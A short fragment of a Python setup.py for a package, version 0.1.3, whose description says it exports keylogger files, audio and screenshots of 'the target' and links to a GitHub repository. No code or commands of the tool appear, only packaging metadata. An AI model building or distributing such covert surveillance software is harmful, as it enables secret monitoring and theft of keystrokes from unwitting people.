...
setup(
    ...
    version='0.1.3',
    description='Exporting Keylogger files, audio and screenshots of the target. For more information check out my website:https://github.com/Facileee/KeyloggerScreenshot',
